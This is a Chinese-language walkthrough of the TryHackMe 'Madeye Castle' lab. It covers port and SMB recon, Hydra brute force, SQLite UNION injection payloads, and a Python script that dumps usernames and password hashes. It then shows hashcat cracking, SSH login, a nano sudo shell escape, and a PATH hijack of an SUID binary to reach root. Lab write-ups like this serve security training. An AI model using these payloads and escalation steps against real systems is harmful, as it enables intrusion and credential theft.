---
title: Madeye Castle (Try Hack Me Writeup)
date: 2021-08-23T13:06:00+08:00
draft: false
url: "/2021/08/23/madeye-castle-try-hack-me-writeup/"
categories:
  - 滲透測試
  - Try Hack Me
showToc: true
TocOpen: false
---

> 
URL : https://tryhackme.com/room/madeyescastle

IP : 10.10.150.136

## Recon

- 掃 Port`rustscan -a 10.10.150.136 -r 1-65535`Open 10.10.150.136:22
- Open 10.10.150.136:80
- Open 10.10.150.136:139
- Open 10.10.150.136:445`nmap -A -p22,80,139,445 10.10.150.136`- ![](/uploads/2022/02/98485-dfltW0w.png)掃路徑- `python3 dirsearch.py -u http://10.10.150.136`backup/觀察首頁- ![](/uploads/2022/02/680e7-MmQ0A0U.png)
- 比起 Apache Default Page 好像多了一個 Logo
- 但是他死ㄌ嘗試 smb- `smbclient -N '//10.10.150.136/sambashare'`
- ![](/uploads/2022/02/2ac48-ncyBB1i.png)匿名登入![](/uploads/2022/02/5e550-nVskJ4S.png)- 下載檔案![](/uploads/2022/02/52cad-tFtDzwX.png)- 觀察檔案
- 感覺很像某種字典檔![](/uploads/2022/02/cb791-ypxWY9H.png)- 另外一個檔案
- 感覺有某些提示， Hagrid 可能用 rockyou 的密碼嘗試 Hydra 爆密碼- `hydra -L user.txt -P spellnames.txt hogwartz-castle.thm http-post-form "/login:user=^USER^&password=^PASS^:Incorrect Username or Password"`
- ![](/uploads/2022/02/db271-CwaK0bw.png)
- 感覺很慢，沒效率，先放著丟一邊觀察首頁的註解- ![](/uploads/2022/02/2cf70-iiWqk7H.png)
- 看起來可以改 `/etc/hosts`![](/uploads/2022/02/7be48-LR8qKGp.png)用 domain name 來訪問首頁- ![](/uploads/2022/02/81a90-QaO8nqV.png)
- ![](/uploads/2022/02/26357-HkJdCpE.png)
- 看起來是可以輸入帳號密碼的頁面掃路徑- ![](/uploads/2022/02/c7cf3-ytCR8pJ.png)
- 看起來沒啥東西

## SQLi

- 嘗試 SQLi亂輸入會噴 500 錯誤![](/uploads/2022/02/62124-hC9IwLa.png)先複製 curl- `curl 'http://hogwartz-castle.thm/login' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://hogwartz-castle.thm' -H 'Connection: keep-alive' -H 'Referer: http://hogwartz-castle.thm/' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'user=aa&password=bb'`可以戳 Union- `'union select 1,2,3,4 --`
- ![](/uploads/2022/02/2363e-8oZED4R.png)測了一些 version 之類的東東都發現不行- 才發現他是 SQLite
- 'union select sqlite_version(),2,3,4 --
- ![](/uploads/2022/02/8d73a-JXv1VVk.png)SQLite 爆表- `'union select name,2,3,4 from sqlite_master WHERE type='table' --`
- ![](/uploads/2022/02/24e77-1S9UvKR.png)
- 發現只有一張 users 的 table爆 Column- `'union select sql,2,3,4 from sqlite_master WHERE type='table' --`
- ![](/uploads/2022/02/ac1d7-DboQSLP.png)
- `name`
- `password`
- `admin`
- `notes`選使用者- `'union select group_concat(name),2,3,4 from users --`
- ![](/uploads/2022/02/810d4-mRsktTI.png)選 admin- ![](/uploads/2022/02/5bf48-hg5rrk1.png)爆 使用者跟密碼組- ![](/uploads/2022/02/5f961-qPtZXaY.png)

```python
import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://hogwartz-castle.thm',
    'Connection': 'keep-alive',
    'Referer': 'http://hogwartz-castle.thm/login',
    'Upgrade-Insecure-Requests': '1',
}

# 'union select 1,2,3,4 --

for i in range(1,40):
    data = {
    'user': f"'union select name || ':' || password,2,3,4 from users limit {i},1 --",
    'password': '123'
    }

    response = requests.post('http://hogwartz-castle.thm/login', headers=headers, data=data)

    name = response.text[27:-19]

    print(name)
```

- 取的所有的 hash![](/uploads/2022/02/cb950-G1a6hwW.png)分析 hash 格式- ![](/uploads/2022/02/9182d-H01hoQz.png)
- SHA 512用哈希貓- ![](/uploads/2022/02/c8036-GRYM30j.png)
- `hashcat -m 1700 hashes.txt spellnames.txt`
- `hashcat -m 1700 hashes.txt /opt/rockyou.txt`
- 發現基本上都爆不出來觀察 notes- `'union select group_concat(notes),2,3,4 from users --`
- ![](/uploads/2022/02/d4224-L5wm2pu.png)
- ![](/uploads/2022/02/6fd9f-z6bqT3d.png)發現密碼用ㄌ `best64`查詢哈希貓 `best64` 的用法- https://github.com/hashcat/hashcat/blob/master/rules/best64.rule
- `hashcat -m 1700 hashes.txt /opt/rockyou.txt -r best64.rule`
- ![](/uploads/2022/02/6531c-lYczWfH.png)
- 成功爆出來密碼`b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885:wingardiumleviosa123`![](/uploads/2022/02/45eb7-fOnYTtK.png)回來用 SQLi 找使用者看看- `'user': "'union select name,2,3,4 from users where password like 'b326e7a6%' --`
- ![](/uploads/2022/02/72170-0xPvGbe.png)
- Harry Turner觀察他的 notes- `"'union select notes,2,3,4 from users where password like 'b326e7a6%' --`
- ![](/uploads/2022/02/e7f01-FKMzlOs.png)
- 使用 first name

## SSH

- `ssh harry@hogwartz-castle.thm`密碼 ： `wingardiumleviosa123`
- ![](/uploads/2022/02/6586f-glQH9j0.png)
- 登入成功
- ![](/uploads/2022/02/1d84e-Ubpctjf.png)

## 提權

- `sudo -l`![](/uploads/2022/02/9b297-9eydEcN.png)
- 發現一個叫做 `pico` 的程式
- 可以用 `hermonine` 執行 pico執行看看- ![](/uploads/2022/02/b1b77-zFhwVe6.png)
- 發現打開是 nano尋找利用方式- https://gtfobins.github.io/gtfobins/nano/#sudo
- `sudo -u hermonine /usr/bin/pico`
- `^R^X`
- `reset; sh 1>&0 2>&0`
- ![](/uploads/2022/02/7fa08-Y0hDfkU.png)
- 成功橫向移動成功取得 User Flag- ![](/uploads/2022/02/1cc36-zBGBeAD.png)

## 二次提權

- 發現使用者根目錄有 `.python_history`![](/uploads/2022/02/f0915-zdfCuju.png)
- 看起來是有用過 pwntools 的遺跡`python -c 'import pty; pty.spawn("/bin/bash")'`- 增加互動性跑豌豆- ![](/uploads/2022/02/2dcbe-OrSd9vs.png)
- ![](/uploads/2022/02/938de-8u9cFVS.png)
- 找到一個奇妙的，有 suid 的檔案`/srv/time-turner/swagger`直接執行- ![](/uploads/2022/02/b422e-aYZMlV9.png)
- 看起來是猜數字遊戲丟進 ida- ![](/uploads/2022/02/242c9-25JLMPW.png)
- 看起來是用 timestamp 當 random seed
- 我們可以自己編譯一個程式，餵入當前時間`date +%s ; /srv/time-turner/swagger`- 可以取得當前 timestamp ，並執行程式編譯自己的 C 語言程式，給予指定的 timestamp- ![](/uploads/2022/02/d16eb-61t2bc2.png)填上去！- ![](/uploads/2022/02/1f3a6-yZ49WFC.png)
- 成功，發現他會呼叫沒有絕對路徑的 uname所以可以蓋 path- ![](/uploads/2022/02/1f0ad-ZN3JkvX.png)
- `/bin/date +%s ;PATH=/home/hermonine/fakepath:$PATH /srv/time-turner/swagger`![](/uploads/2022/02/4f23b-vM33O0T.png)
- 就成功 root 了取得 Root Flag- ![](/uploads/2022/02/d93ef-VGKzQVe.png)
- `RME{M@rK-3veRy-hOur-0135d3f8ab9fd5bf}`
